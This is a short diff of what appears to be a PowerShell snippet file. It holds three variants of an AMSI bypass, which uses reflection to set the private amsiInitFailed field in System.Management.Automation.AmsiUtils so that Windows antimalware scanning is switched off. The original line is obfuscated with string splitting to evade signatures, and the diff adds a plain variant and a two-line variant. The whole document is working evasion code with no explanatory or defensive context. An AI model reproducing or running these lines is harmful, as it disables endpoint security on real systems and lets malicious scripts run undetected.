@@ -1,1 +1,7 @@
 $a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
+
+$A='System.Management.Automation.AmsiUtils';$B='amsiInitFailed';[Ref].Assembly.GetType($A).GetField($B,'NonPublic,Static').SetValue($null,$true)
+
+
+$amsi = 'AmsiUtils';$type=[Ref].Assembly.GetType("System.Management.Automation." + $amsi)
+$type.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
